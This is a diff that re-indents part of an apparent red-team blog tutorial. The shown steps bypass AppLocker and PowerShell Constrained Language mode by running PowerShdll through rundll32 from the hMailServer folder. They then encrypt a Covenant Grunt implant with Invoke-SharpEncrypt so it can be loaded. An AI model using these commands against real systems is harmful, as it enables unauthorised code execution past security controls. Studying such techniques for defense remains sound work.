@@ -182,22 +182,21 @@ The whole attack is carried out on a low priv account.
 
 2. Bypass AppLocker and ContrainedLanguage  
   
-So now that we know how - let´s get our hands dirty.  
+   So now that we know how - let´s get our hands dirty.  
 
-Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
-```
-rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
-```  
+   Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
+   ```
+   rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
+   ```  
 
- ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
+   ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
 
-{:start="3"}
 3. Prepare Invoke-SharpLoader  
-Encrypt our default Grunt.exe    
-```
-. .\Invoke-SharpEncrypt.ps1  
-Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
-``` 
+    Encrypt our default Grunt.exe    
+    ```
+    . .\Invoke-SharpEncrypt.ps1  
+    Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
+    ``` 
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/sharpencrypt.png  "sharpencrypt")
 
